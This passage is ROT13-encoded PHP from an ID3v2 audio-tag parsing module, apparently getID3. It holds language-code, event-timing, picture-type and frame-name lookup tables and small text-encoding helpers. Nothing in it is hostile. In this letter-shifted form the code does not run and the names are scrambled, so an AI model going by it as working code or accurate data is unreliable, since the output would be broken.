			yva	Yvatnyn
			yvg	Yvguhnavna
			yby	Zbatb
			ybm	Ybmv
			ygm	Yrgmrohetrfpu
			yho	Yhon-Xngnatn
			yht	Tnaqn
			yhv	Yhvfrab
			yha	Yhaqn
			yhb	Yhb (Xraln naq Gnamnavn)
			znp	Znprqbavna
			znq	Znqherfr
			znt	Zntnuv
			znu	Znefunyy
			znv	Znvguvyv
			znx	Znprqbavna
			znx	Znxnfne
			zny	Znynlnynz
			zna	Znaqvatb
			znb	Znbev
			znc	Nhfgebarfvna (Bgure)
			zne	Znenguv
			znf	Znfnv
			znk	Znak
			znl	Znynl
			zra	Zraqr
			ztn	Vevfu, Zvqqyr (900 - 1200)
			zvp	Zvpznp
			zva	Zvanatxnonh
			zvf	Zvfpryynarbhf (Bgure)
			zxu	Zba-Xzre (Bgure)
			zyt	Znyntnfl
			zyg	Znygrfr
			zav	Znavchev
			zab	Znabob Ynathntrf
			zbu	Zbunjx
			zby	Zbyqnivna
			zba	Zbatbyvna
			zbf	Zbffv
			zev	Znbev
			zfn	Znynl
			zhy	Zhygvcyr Ynathntrf
			zha	Zhaqn Ynathntrf
			zhf	Perrx
			zje	Znejnev
			zln	Ohezrfr
			zla	Znlna Ynathntrf
			anu	Nmgrp
			anv	Abegu Nzrevpna Vaqvna (Bgure)
			anh	Anheh
			ani	Aninwb
			aoy	Aqroryr, Fbhgu
			aqr	Aqroryr, Abegu
			aqb	Aqbatb
			arc	Arcnyv
			arj	Arjnev
			avp	Avtre-Xbeqbsnavna (Bgure)
			avh	Avhrna
			ayn	Qhgpu
			aab	Abejrtvna (Alabefx)
			aba	Abefr, Byq
			abe	Abejrtvna
			afb	Fbgub, Abegurea
			aho	Ahovna Ynathntrf
			aln	Alnawn
			alz	Alnzjrmv
			ala	Alnaxbyr
			alb	Albeb
			amv	Amvzn
			bpv	Ynathr q'Bp (cbfg 1500)
			bwv	Bwvojn
			bev	Bevln
			bez	Bebzb
			bfn	Bfntr
			bff	Bffrgvp
			bgn	Ghexvfu, Bggbzna (1500 - 1928)
			bgb	Bgbzvna Ynathntrf
			cnn	Cnchna-Nhfgenyvna (Bgure)
			cnt	Cnatnfvana
			cny	Cnuyniv
			cnz	Cnzcnatn
			cna	Cnawnov
			cnc	Cncvnzragb
			cnh	Cnynhna
			crb	Crefvna, Byq (pn 600 - 400 O.P.)
			cre	Crefvna
			cua	Cubravpvna
			cyv	Cnyv
			cby	Cbyvfu
			cba	Cbancr
			cbe	Cbeghthrfr
			cen	Cenxevg hntrf
			ceb	Cebirapny, Byq (gb 1500)
			chf	Chfugb
			dhr	Dhrpuhn
			enw	Enwnfgunav
			ene	Enebgbatna
			ebn	Ebznapr (Bgure)
			ebu	Eunrgb-Ebznapr
			ebz	Ebznal
			eba	Ebznavna
			ehz	Ebznavna
			eha	Ehaqv
			ehf	Ehffvna
			fnq	Fnaqnjr
			fnt	Fnatb
			fnu	Lnxhg
			fnv	Fbhgu Nzrevpna Vaqvna (Bgure)
			fny	Fnyvfuna Ynathntrf
			fnz	Fnznevgna Nenznvp
			fna	Fnafxevg
			fpb	Fpbgf
			fpe	Freob-Pebngvna
			fry	Fryxhc
			frz	Frzvgvp (Bgure)
			ftn	Vevfu, Byq (gb 900)
			fua	Funa
			fvq	Fvqnzb
			fva	Fvatunyrfr
			fvb	Fvbhna Ynathntrf
			fvg	Fvab-Gvorgna (Bgure)
			fyn	Fynivp (Bgure)
			fyx	Fybinx
			fyb	Fybinx
			fyi	Fybiravna
			fzv	Fnzv Ynathntrf
			fzb	Fnzbna
			fan	Fuban
			faq	Fvaquv
			fbt	Fbtqvna
			fbz	Fbznyv
			fba	Fbatunv
			fbg	Fbgub, Fbhgurea
			fcn	Fcnavfu
			fdv	Nyonavna
			feq	Fneqvavna
			fee	Frere
			ffn	Avyb-Fnunena (Bgure)
			ffj	Fvfjnag
			ffj	Fjnmv
			fhx	Fhxhzn
			fha	Fhqnarfr
			fhf	Fhfh
			fhk	Fhzrevna
			fir	Fjrqvfu
			fjn	Fjnuvyv
			fjr	Fjrqvfu
			fle	Flevnp
			gnu	Gnuvgvna
			gnz	Gnzvy
			gng	Gngne
			gry	Gryhth
			grz	Gvzar
			gre	Grerab
			gtx	Gnwvx
			gty	Gntnybt
			gun	Gunv
			gvo	Gvorgna
			gvt	Gvter
			gve	Gvtevaln
			gvi	Gviv
			gyv	Gyvatvg
			gzu	Gnznfurx
			gbt	Gbatn (Alnfn)
			gba	Gbatn (Gbatn Vfynaqf)
			geh	Gehx
			gfv	Gfvzfuvna
			gfa	Gfjnan
			gfb	Gfbatn
			ghx	Ghexzra
			ghz	Ghzohxn
			ghe	Ghexvfu
			ghg	Nygnvp (Bgure)
			gjv	Gjv
			gli	Ghivavna
			htn	Htnevgvp
			hvt	Hvtuhe
			hxe	Hxenvavna
			hzo	Hzohaqh
			haq	Haqrgrezvarq
			heq	Heqh
			hmo	Hmorx
			inv	Inv
			ira	Iraqn
			ivr	Ivrganzrfr
			iby	Ibyncüx
			ibg	Ibgvp
			jnx	Jnxnfuna Ynathntrf
			jny	Jnynzb
			jne	Jnenl
			jnf	Jnfub
			jry	Jryfu
			jra	Fbeovna Ynathntrf
			jby	Jbybs
			kub	Kubfn
			lnb	Lnb
			lnc	Lnc
			lvq	Lvqqvfu
			lbe	Lbehon
			mnc	Mncbgrp
			mra	Mrantn
			mun	Muhnat
			mub	Puvarfr
			mhy	Mhyh
			mha	Mhav

		*/

		erghea trgvq3_yvo::RzorqqrqYbbxhc($ynathntrpbqr, $ortva, __YVAR__, __SVYR__, 'vq3i2-ynathntrpbqr');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba RGPBRiragYbbxhc($vaqrk) {
		vs (($vaqrk >= 0k17) && ($vaqrk <= 0kQS)) {
			erghea 'erfreirq sbe shgher hfr';
		}
		vs (($vaqrk >= 0kR0) && ($vaqrk <= 0kRS)) {
			erghea 'abg cerqrsvarq flapu 0-S';
		}
		vs (($vaqrk >= 0kS0) && ($vaqrk <= 0kSP)) {
			erghea 'erfreirq sbe shgher hfr';
		}

		fgngvp $RiragYbbxhc = neenl(
			0k00 => 'cnqqvat (unf ab zrnavat)',
			0k01 => 'raq bs vavgvny fvyrapr',
			0k02 => 'vageb fgneg',
			0k03 => 'znva cneg fgneg',
			0k04 => 'bhgeb fgneg',
			0k05 => 'bhgeb raq',
			0k06 => 'irefr fgneg',
			0k07 => 'ersenva fgneg',
			0k08 => 'vagreyhqr fgneg',
			0k09 => 'gurzr fgneg',
			0k0N => 'inevngvba fgneg',
			0k0O => 'xrl punatr',
			0k0P => 'gvzr punatr',
			0k0Q => 'zbzragnel hajnagrq abvfr (Fanc, Penpxyr & Cbc)',
			0k0R => 'fhfgnvarq abvfr',
			0k0S => 'fhfgnvarq abvfr raq',
			0k10 => 'vageb raq',
			0k11 => 'znva cneg raq',
			0k12 => 'irefr raq',
			0k13 => 'ersenva raq',
			0k14 => 'gurzr raq',
			0k15 => 'cebsnavgl',
			0k16 => 'cebsnavgl raq',
			0kSQ => 'nhqvb raq (fgneg bs fvyrapr)',
			0kSR => 'nhqvb svyr raqf',
			0kSS => 'bar zber olgr bs riragf sbyybjf'
		);

		erghea (vffrg($RiragYbbxhc[$vaqrk]) ? $RiragYbbxhc[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba FLGYPbagragGlcrYbbxhc($vaqrk) {
		fgngvp $FLGYPbagragGlcrYbbxhc = neenl(
			0k00 => 'bgure',
			0k01 => 'ylevpf',
			0k02 => 'grkg genafpevcgvba',
			0k03 => 'zbirzrag/cneg anzr', // (r.t. 'Nqntvb')
			0k04 => 'riragf',             // (r.t. 'Qba Dhvwbgr ragref gur fgntr')
			0k05 => 'pubeq',              // (r.t. 'Oo S Sfhf')
			0k06 => 'gevivn/\'cbc hc\' vasbezngvba',
			0k07 => 'HEYf gb jrocntrf',
			0k08 => 'HEYf gb vzntrf'
		);

		erghea (vffrg($FLGYPbagragGlcrYbbxhc[$vaqrk]) ? $FLGYPbagragGlcrYbbxhc[$vaqrk] : '');
	}

	/**
	 * @cnenz vag   $vaqrk
	 * @cnenz obby $ergheaneenl
	 *
	 * @erghea neenl|fgevat
	 */
	choyvp fgngvp shapgvba NCVPCvpgherGlcrYbbxhc($vaqrk, $ergheaneenl=snyfr) {
		fgngvp $NCVPCvpgherGlcrYbbxhc = neenl(
			0k00 => 'Bgure',
			0k01 => '32k32 cvkryf \'svyr vpba\' (CAT bayl)',
			0k02 => 'Bgure svyr vpba',
			0k03 => 'Pbire (sebag)',
			0k04 => 'Pbire (onpx)',
			0k05 => 'Yrnsyrg cntr',
			0k06 => 'Zrqvn (r.t. ynory fvqr bs PQ)',
			0k07 => 'Yrnq negvfg/yrnq cresbezre/fbybvfg',
			0k08 => 'Negvfg/cresbezre',
			0k09 => 'Pbaqhpgbe',
			0k0N => 'Onaq/Bepurfgen',
			0k0O => 'Pbzcbfre',
			0k0P => 'Ylevpvfg/grkg jevgre',
			0k0Q => 'Erpbeqvat Ybpngvba',
			0k0R => 'Qhevat erpbeqvat',
			0k0S => 'Qhevat cresbeznapr',
			0k10 => 'Zbivr/ivqrb fperra pncgher',
			0k11 => 'N oevtug pbybherq svfu',
			0k12 => 'Vyyhfgengvba',
			0k13 => 'Onaq/negvfg ybtbglcr',
			0k14 => 'Choyvfure/Fghqvb ybtbglcr'
		);
		vs ($ergheaneenl) {
			erghea $NCVPCvpgherGlcrYbbxhc;
		}
		erghea (vffrg($NCVPCvpgherGlcrYbbxhc[$vaqrk]) ? $NCVPCvpgherGlcrYbbxhc[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba PBZEErprvirqNfYbbxhc($vaqrk) {
		fgngvp $PBZEErprvirqNfYbbxhc = neenl(
			0k00 => 'Bgure',
			0k01 => 'Fgnaqneq PQ nyohz jvgu bgure fbatf',
			0k02 => 'Pbzcerffrq nhqvb ba PQ',
			0k03 => 'Svyr bire gur Vagrearg',
			0k04 => 'Fgernz bire gur Vagrearg',
			0k05 => 'Nf abgr furrgf',
			0k06 => 'Nf abgr furrgf va n obbx jvgu bgure furrgf',
			0k07 => 'Zhfvp ba bgure zrqvn',
			0k08 => 'Aba-zhfvpny zrepunaqvfr'
		);

		erghea (vffrg($PBZEErprvirqNfYbbxhc[$vaqrk]) ? $PBZEErprvirqNfYbbxhc[$vaqrk] : '');
	}

	/**
	 * @cnenz vag $vaqrk
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba EIN2PunaaryGlcrYbbxhc($vaqrk) {
		fgngvp $EIN2PunaaryGlcrYbbxhc = neenl(
			0k00 => 'Bgure',
			0k01 => 'Znfgre ibyhzr',
			0k02 => 'Sebag evtug',
			0k03 => 'Sebag yrsg',
			0k04 => 'Onpx evtug',
			0k05 => 'Onpx yrsg',
			0k06 => 'Sebag prager',
			0k07 => 'Onpx prager',
			0k08 => 'Fhojbbsre'
		);

		erghea (vffrg($EIN2PunaaryGlcrYbbxhc[$vaqrk]) ? $EIN2PunaaryGlcrYbbxhc[$vaqrk] : '');
	}

	/**
	 * @cnenz fgevat $senzranzr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba SenzrAnzrYbatYbbxhc($senzranzr) {

		$ortva = __YVAR__;

		/** Guvf vf abg n pbzzrag!

			NRAP	Nhqvb rapelcgvba
			NCVP	Nggnpurq cvpgher
			NFCV	Nhqvb frrx cbvag vaqrk
			OHS	Erpbzzraqrq ohssre fvmr
			PAG	Cynl pbhagre
			PBZ	Pbzzragf
			PBZZ	Pbzzragf
			PBZE	Pbzzrepvny senzr
			PEN	Nhqvb rapelcgvba
			PEZ	Rapelcgrq zrgn senzr
			RAPE	Rapelcgvba zrgubq ertvfgengvba
			RDH	Rdhnyvfngvba
			RDH2	Rdhnyvfngvba (2)
			RDHN	Rdhnyvfngvba
			RGP	Rirag gvzvat pbqrf
			RGPB	Rirag gvzvat pbqrf
			TRB	Trareny rapncfhyngrq bowrpg
			TRBO	Trareny rapncfhyngrq bowrpg
			TEVQ	Tebhc vqragvsvpngvba ertvfgengvba
			VCY	Vaibyirq crbcyr yvfg
			VCYF	Vaibyirq crbcyr yvfg
			YVAX	Yvaxrq vasbezngvba
			YAX	Yvaxrq vasbezngvba
			ZPQV	Zhfvp PQ vqragvsvre
			ZPV	Zhfvp PQ Vqragvsvre
			ZYY	ZCRT ybpngvba ybbxhc gnoyr
			ZYYG	ZCRT ybpngvba ybbxhc gnoyr
			BJAR	Bjarefuvc senzr
			CPAG	Cynl pbhagre
			CVP	Nggnpurq cvpgher
			CBC	Cbchynevzrgre
			CBCZ	Cbchynevzrgre
			CBFF	Cbfvgvba flapuebavfngvba senzr
			CEVI	Cevingr senzr
			EOHS	Erpbzzraqrq ohssre fvmr
			ERI	Erireo
			EIN	Eryngvir ibyhzr nqwhfgzrag
			EIN2	Eryngvir ibyhzr nqwhfgzrag (2)
			EINQ	Eryngvir ibyhzr nqwhfgzrag
			EIEO	Erireo
			FRRX	Frrx senzr
			FVTA	Fvtangher senzr
			FYG	Flapuebavfrq ylevp/grkg
			FGP	Flaprq grzcb pbqrf
			FLYG	Flapuebavfrq ylevp/grkg
			FLGP	Flapuebavfrq grzcb pbqrf
			GNY	Nyohz/Zbivr/Fubj gvgyr
			GNYO	Nyohz/Zbivr/Fubj gvgyr
			GOC	OCZ (Orngf Cre Zvahgr)
			GOCZ	OCZ (orngf cre zvahgr)
			GPZ	Pbzcbfre
			GPZC	Cneg bs n pbzcvyngvba
			GPB	Pbagrag glcr
			GPBZ	Pbzcbfre
			GPBA	Pbagrag glcr
			GPBC	Pbclevtug zrffntr
			GPC	Cneg bs n pbzcvyngvba
			GPE	Pbclevtug zrffntr
			GQN	Qngr
			GQNG	Qngr
			GQRA	Rapbqvat gvzr
			GQYL	Cynlyvfg qrynl
			GQBE	Bevtvany eryrnfr gvzr
			GQEP	Erpbeqvat gvzr
			GQEY	Eryrnfr gvzr
			GQGT	Gnttvat gvzr
			GQL	Cynlyvfg qrynl
			GRA	Rapbqrq ol
			GRAP	Rapbqrq ol
			GRKG	Ylevpvfg/Grkg jevgre
			GSYG	Svyr glcr
			GSG	Svyr glcr
			GVZ	Gvzr
			GVZR	Gvzr
			GVCY	Vaibyirq crbcyr yvfg
			GVG1	Pbagrag tebhc qrfpevcgvba
			GVG2	Gvgyr/fbatanzr/pbagrag qrfpevcgvba
			GVG3	Fhogvgyr/Qrfpevcgvba ersvarzrag
			GXR	Vavgvny xrl
			GXRL	Vavgvny xrl
			GYN	Ynathntr(f)
			GYNA	Ynathntr(f)
			GYR	Yratgu
			GYRA	Yratgu
			GZPY	Zhfvpvna perqvgf yvfg
			GZRQ	Zrqvn glcr
			GZBB	Zbbq
			GZG	Zrqvn glcr
			GBN	Bevtvany negvfg(f)/cresbezre(f)
			GBNY	Bevtvany nyohz/zbivr/fubj gvgyr
			GBS	Bevtvany svyranzr
			GBSA	Bevtvany svyranzr
			GBY	Bevtvany Ylevpvfg(f)/grkg jevgre(f)
			GBYL	Bevtvany ylevpvfg(f)/grkg jevgre(f)
			GBCR	Bevtvany negvfg(f)/cresbezre(f)
			GBE	Bevtvany eryrnfr lrne
			GBEL	Bevtvany eryrnfr lrne
			GBG	Bevtvany nyohz/Zbivr/Fubj gvgyr
			GBJA	Svyr bjare/yvprafrr
			GC1	Yrnq negvfg(f)/Yrnq cresbezre(f)/Fbybvfg(f)/Cresbezvat tebhc
			GC2	Onaq/Bepurfgen/Nppbzcnavzrag
			GC3	Pbaqhpgbe/Cresbezre ersvarzrag
			GC4	Vagrecergrq, erzvkrq, be bgurejvfr zbqvsvrq ol
			GCN	Cneg bs n frg
			GCO	Choyvfure
			GCR1	Yrnq cresbezre(f)/Fbybvfg(f)
			GCR2	Onaq/bepurfgen/nppbzcnavzrag
			GCR3	Pbaqhpgbe/cresbezre ersvarzrag
			GCR4	Vagrecergrq, erzvkrq, be bgurejvfr zbqvsvrq ol
			GCBF	Cneg bs n frg
			GCEB	Cebqhprq abgvpr
			GCHO	Choyvfure
			GEP	VFEP (Vagreangvbany Fgnaqneq Erpbeqvat Pbqr)
			GEPX	Genpx ahzore/Cbfvgvba va frg
			GEQ	Erpbeqvat qngrf
			GEQN	Erpbeqvat qngrf
			GEX	Genpx ahzore/Cbfvgvba va frg
			GEFA	Vagrearg enqvb fgngvba anzr
			GEFB	Vagrearg enqvb fgngvba bjare
			GF2	Nyohz-Negvfg fbeg beqre
			GFN	Nyohz fbeg beqre
			GFP	Pbzcbfre fbeg beqre
			GFV	Fvmr
			GFVM	Fvmr
			GFB2	Nyohz-Negvfg fbeg beqre
			GFBN	Nyohz fbeg beqre
			GFBP	Pbzcbfre fbeg beqre
			GFBC	Cresbezre fbeg beqre
			GFBG	Gvgyr fbeg beqre
			GFC	Cresbezre fbeg beqre
			GFEP	VFEP (vagreangvbany fgnaqneq erpbeqvat pbqr)
			GFF	Fbsgjner/uneqjner naq frggvatf hfrq sbe rapbqvat
			GFFR	Fbsgjner/Uneqjner naq frggvatf hfrq sbe rapbqvat
			GFFG	Frg fhogvgyr
			GFG	Gvgyr fbeg beqre
			GG1	Pbagrag tebhc qrfpevcgvba
			GG2	Gvgyr/Fbatanzr/Pbagrag qrfpevcgvba
			GG3	Fhogvgyr/Qrfpevcgvba ersvarzrag
			GKG	Ylevpvfg/grkg jevgre
			GKK	Hfre qrsvarq grkg vasbezngvba senzr
			GKKK	Hfre qrsvarq grkg vasbezngvba senzr
			GLR	Lrne
			GLRE	Lrne
			HSV	Havdhr svyr vqragvsvre
			HSVQ	Havdhr svyr vqragvsvre
			HYG	Haflapuebavfrq ylevp/grkg genafpevcgvba
			HFRE	Grezf bs hfr
			HFYG	Haflapuebavfrq ylevp/grkg genafpevcgvba
			JNS	Bssvpvny nhqvb svyr jrocntr
			JNE	Bssvpvny negvfg/cresbezre jrocntr
			JNF	Bssvpvny nhqvb fbhepr jrocntr
			JPZ	Pbzzrepvny vasbezngvba
			JPBZ	Pbzzrepvny vasbezngvba
			JPBC	Pbclevtug/Yrtny vasbezngvba
			JPC	Pbclevtug/Yrtny vasbezngvba
			JBNS	Bssvpvny nhqvb svyr jrocntr
			JBNE	Bssvpvny negvfg/cresbezre jrocntr
			JBNF	Bssvpvny nhqvb fbhepr jrocntr
			JBEF	Bssvpvny Vagrearg enqvb fgngvba ubzrcntr
			JCNL	Cnlzrag
			JCO	Choyvfuref bssvpvny jrocntr
			JCHO	Choyvfuref bssvpvny jrocntr
			JKK	Hfre qrsvarq HEY yvax senzr
			JKKK	Hfre qrsvarq HEY yvax senzr
			GSRN	Srngherq Negvfg
			GFGH	Erpbeqvat Fghqvb
			etnq	Ercynl Tnva Nqwhfgzrag

		*/

		erghea trgvq3_yvo::RzorqqrqYbbxhc($senzranzr, $ortva, __YVAR__, __SVYR__, 'vq3i2-senzranzr_ybat');

		// Ynfg guerr:
		// sebz Uryvhz2 [jjj.uryvhz2.pbz]
		// sebz uggc://cevingrjjj.rffrk.np.hx/~qwzebo/ercynltnva/svyr_sbezng_vq3i2.ugzy
	}

	/**
	 * @cnenz fgevat $senzranzr
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba SenzrAnzrFubegYbbxhc($senzranzr) {

		$ortva = __YVAR__;

		/** Guvf vf abg n pbzzrag!

			NRAP	nhqvb_rapelcgvba
			NCVP	nggnpurq_cvpgher
			NFCV	nhqvb_frrx_cbvag_vaqrk
			OHS	erpbzzraqrq_ohssre_fvmr
			PAG	cynl_pbhagre
			PBZ	pbzzrag
			PBZZ	pbzzrag
			PBZE	pbzzrepvny_senzr
			PEN	nhqvb_rapelcgvba
			PEZ	rapelcgrq_zrgn_senzr
			RAPE	rapelcgvba_zrgubq_ertvfgengvba
			RDH	rdhnyvfngvba
			RDH2	rdhnyvfngvba
			RDHN	rdhnyvfngvba
			RGP	rirag_gvzvat_pbqrf
			RGPB	rirag_gvzvat_pbqrf
			TRB	trareny_rapncfhyngrq_bowrpg
			TRBO	trareny_rapncfhyngrq_bowrpg
			TEVQ	tebhc_vqragvsvpngvba_ertvfgengvba
			VCY	vaibyirq_crbcyr_yvfg
			VCYF	vaibyirq_crbcyr_yvfg
			YVAX	yvaxrq_vasbezngvba
			YAX	yvaxrq_vasbezngvba
			ZPQV	zhfvp_pq_vqragvsvre
			ZPV	zhfvp_pq_vqragvsvre
			ZYY	zcrt_ybpngvba_ybbxhc_gnoyr
			ZYYG	zcrt_ybpngvba_ybbxhc_gnoyr
			BJAR	bjarefuvc_senzr
			CPAG	cynl_pbhagre
			CVP	nggnpurq_cvpgher
			CBC	cbchynevzrgre
			CBCZ	cbchynevzrgre
			CBFF	cbfvgvba_flapuebavfngvba_senzr
			CEVI	cevingr_senzr
			EOHS	erpbzzraqrq_ohssre_fvmr
			ERI	erireo
			EIN	eryngvir_ibyhzr_nqwhfgzrag
			EIN2	eryngvir_ibyhzr_nqwhfgzrag
			EINQ	eryngvir_ibyhzr_nqwhfgzrag
			EIEO	erireo
			FRRX	frrx_senzr
			FVTA	fvtangher_senzr
			FYG	flapuebavfrq_ylevp
			FGP	flaprq_grzcb_pbqrf
			FLYG	flapuebavfrq_ylevp
			FLGP	flapuebavfrq_grzcb_pbqrf
			GNY	nyohz
			GNYO	nyohz
			GOC	ocz
			GOCZ	ocz
			GPZ	pbzcbfre
			GPZC	cneg_bs_n_pbzcvyngvba
			GPB	traer
			GPBZ	pbzcbfre
			GPBA	traer
			GPBC	pbclevtug_zrffntr
			GPC	cneg_bs_n_pbzcvyngvba
			GPE	pbclevtug_zrffntr
			GQN	qngr
			GQNG	qngr
			GQRA	rapbqvat_gvzr
			GQYL	cynlyvfg_qrynl
			GQBE	bevtvany_eryrnfr_gvzr
			GQEP	erpbeqvat_gvzr
			GQEY	eryrnfr_gvzr
			GQGT	gnttvat_gvzr
			GQL	cynlyvfg_qrynl
			GRA	rapbqrq_ol
			GRAP	rapbqrq_ol
			GRKG	ylevpvfg
			GSYG	svyr_glcr
			GSG	svyr_glcr
			GVZ	gvzr
			GVZR	gvzr
			GVCY	vaibyirq_crbcyr_yvfg
			GVG1	pbagrag_tebhc_qrfpevcgvba
			GVG2	gvgyr
			GVG3	fhogvgyr
			GXR	vavgvny_xrl
			GXRL	vavgvny_xrl
			GYN	ynathntr
			GYNA	ynathntr
			GYR	yratgu
			GYRA	yratgu
			GZPY	zhfvpvna_perqvgf_yvfg
			GZRQ	zrqvn_glcr
			GZBB	zbbq
			GZG	zrqvn_glcr
			GBN	bevtvany_negvfg
			GBNY	bevtvany_nyohz
			GBS	bevtvany_svyranzr
			GBSA	bevtvany_svyranzr
			GBY	bevtvany_ylevpvfg
			GBYL	bevtvany_ylevpvfg
			GBCR	bevtvany_negvfg
			GBE	bevtvany_lrne
			GBEL	bevtvany_lrne
			GBG	bevtvany_nyohz
			GBJA	svyr_bjare
			GC1	negvfg
			GC2	onaq
			GC3	pbaqhpgbe
			GC4	erzvkre
			GCN	cneg_bs_n_frg
			GCO	choyvfure
			GCR1	negvfg
			GCR2	onaq
			GCR3	pbaqhpgbe
			GCR4	erzvkre
			GCBF	cneg_bs_n_frg
			GCEB	cebqhprq_abgvpr
			GCHO	choyvfure
			GEP	vfep
			GEPX	genpx_ahzore
			GEQ	erpbeqvat_qngrf
			GEQN	erpbeqvat_qngrf
			GEX	genpx_ahzore
			GEFA	vagrearg_enqvb_fgngvba_anzr
			GEFB	vagrearg_enqvb_fgngvba_bjare
			GF2	nyohz_negvfg_fbeg_beqre
			GFN	nyohz_fbeg_beqre
			GFP	pbzcbfre_fbeg_beqre
			GFV	fvmr
			GFVM	fvmr
			GFB2	nyohz_negvfg_fbeg_beqre
			GFBN	nyohz_fbeg_beqre
			GFBP	pbzcbfre_fbeg_beqre
			GFBC	cresbezre_fbeg_beqre
			GFBG	gvgyr_fbeg_beqre
			GFC	cresbezre_fbeg_beqre
			GFEP	vfep
			GFF	rapbqre_frggvatf
			GFFR	rapbqre_frggvatf
			GFFG	frg_fhogvgyr
			GFG	gvgyr_fbeg_beqre
			GG1	pbagrag_tebhc_qrfpevcgvba
			GG2	gvgyr
			GG3	fhogvgyr
			GKG	ylevpvfg
			GKK	grkg
			GKKK	grkg
			GLR	lrne
			GLRE	lrne
			HSV	havdhr_svyr_vqragvsvre
			HSVQ	havdhr_svyr_vqragvsvre
			HYG	haflapuebavfrq_ylevp
			HFRE	grezf_bs_hfr
			HFYG	haflapuebavfrq_ylevp
			JNS	hey_svyr
			JNE	hey_negvfg
			JNF	hey_fbhepr
			JPZ	pbzzrepvny_vasbezngvba
			JPBZ	pbzzrepvny_vasbezngvba
			JPBC	pbclevtug
			JPC	pbclevtug
			JBNS	hey_svyr
			JBNE	hey_negvfg
			JBNF	hey_fbhepr
			JBEF	hey_fgngvba
			JCNL	hey_cnlzrag
			JCO	hey_choyvfure
			JCHO	hey_choyvfure
			JKK	hey_hfre
			JKKK	hey_hfre
			GSRN	srngherq_negvfg
			GFGH	erpbeqvat_fghqvb
			etnq	ercynl_tnva_nqwhfgzrag

		*/

		erghea trgvq3_yvo::RzorqqrqYbbxhc($senzranzr, $ortva, __YVAR__, __SVYR__, 'vq3i2-senzranzr_fubeg');
	}

	/**
	 * @cnenz fgevat $rapbqvat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba GrkgRapbqvatGrezvangbeYbbxhc($rapbqvat) {
		// uggc://jjj.vq3.bet/vq3i2.4.0-fgehpgher.gkg
		// Senzrf gung nyybj qvssrerag glcrf bs grkg rapbqvat pbagnvaf n grkg rapbqvat qrfpevcgvba olgr. Cbffvoyr rapbqvatf:
		fgngvp $GrkgRapbqvatGrezvangbeYbbxhc = neenl(
			0   => \"\k00\",     // $00  VFB-8859-1. Grezvangrq jvgu $00.
			1   => \"\k00\k00\", // $01  HGS-16 rapbqrq Havpbqr jvgu OBZ. Nyy fgevatf va gur fnzr senzr FUNYY unir gur fnzr olgrbeqre. Grezvangrq jvgu $00 00.
			2   => \"\k00\k00\", // $02  HGS-16OR rapbqrq Havpbqr jvgubhg OBZ. Grezvangrq jvgu $00 00.
			3   => \"\k00\",     // $03  HGS-8 rapbqrq Havpbqr. Grezvangrq jvgu $00.
			255 => \"\k00\k00\"
		);
		erghea (vffrg($GrkgRapbqvatGrezvangbeYbbxhc[$rapbqvat]) ? $GrkgRapbqvatGrezvangbeYbbxhc[$rapbqvat] : \"\k00\");
	}

	/**
	 * @cnenz vag $rapbqvat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba GrkgRapbqvatAnzrYbbxhc($rapbqvat) {
		// uggc://jjj.vq3.bet/vq3i2.4.0-fgehpgher.gkg
		// Senzrf gung nyybj qvssrerag glcrf bs grkg rapbqvat pbagnvaf n grkg rapbqvat qrfpevcgvba olgr. Cbffvoyr rapbqvatf:
		fgngvp $GrkgRapbqvatAnzrYbbxhc = neenl(
			0   => 'VFB-8859-1', // $00  VFB-8859-1. Grezvangrq jvgu $00.
			1   => 'HGS-16',     // $01  HGS-16 rapbqrq Havpbqr jvgu OBZ. Nyy fgevatf va gur fnzr senzr FUNYY unir gur fnzr olgrbeqre. Grezvangrq jvgu $00 00.
			2   => 'HGS-16OR',   // $02  HGS-16OR rapbqrq Havpbqr jvgubhg OBZ. Grezvangrq jvgu $00 00.
			3   => 'HGS-8',      // $03  HGS-8 rapbqrq Havpbqr. Grezvangrq jvgu $00.
			255 => 'HGS-16OR'
		);
		erghea (vffrg($GrkgRapbqvatAnzrYbbxhc[$rapbqvat]) ? $GrkgRapbqvatAnzrYbbxhc[$rapbqvat] : 'VFB-8859-1');
	}

	/**
	 * @cnenz fgevat $fgevat
	 * @cnenz fgevat $grezvangbe
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ErzbirFgevatGrezvangbe($fgevat, $grezvangbe) {
		// Ahyy grezvangbe ng raq bs pbzzrag fgevat vf fbzrjung nzovthbhf va gur fcrpvsvpngvba, znl be znl abg or vzcyrzragrq ol inevbhf gnttref. Erzbir grezvangbe bayl vs cerfrag.
		// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/121
		// uggcf://pbzzhavgl.zc3gnt.qr/g/k-genvyvat-ahyyf-va-vq3i2-pbzzragf/19227
		vs (fhofge($fgevat, -fgeyra($grezvangbe), fgeyra($grezvangbe)) === $grezvangbe) {
			$fgevat = fhofge($fgevat, 0, -fgeyra($grezvangbe));
		}
		erghea $fgevat;
	}

	/**
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba ZnxrHGS16rzcglFgevatRzcgl($fgevat) {
		vs (va_neenl($fgevat, neenl(\"\k00\", \"\k00\k00\", \"\kSS\kSR\", \"\kSR\kSS\"))) {
			// vs fgevat bayl pbagnvaf n OBZ be grezvangbe gura znxr vg npghnyyl na rzcgl fgevat
			$fgevat = '';
		}
		erghea $fgevat;
	}

	/**
	 * @cnenz fgevat $senzranzr
	 * @cnenz vag    $vq3i2znwbeirefvba
	 *
	 * @erghea obby|vag
	 */
	choyvp fgngvp shapgvba VfInyvqVQ3i2SenzrAnzr($senzranzr, $vq3i2znwbeirefvba) {
		fjvgpu ($vq3i2znwbeirefvba) {
			pnfr 2:
				erghea cert_zngpu('#[N-M][N-M0-9]{2}#', $senzranzr);

			pnfr 3:
			pnfr 4:
				erghea cert_zngpu('#[N-M][N-M0-9]{3}#', $senzranzr);
		}
		erghea snyfr;
	}

	/**
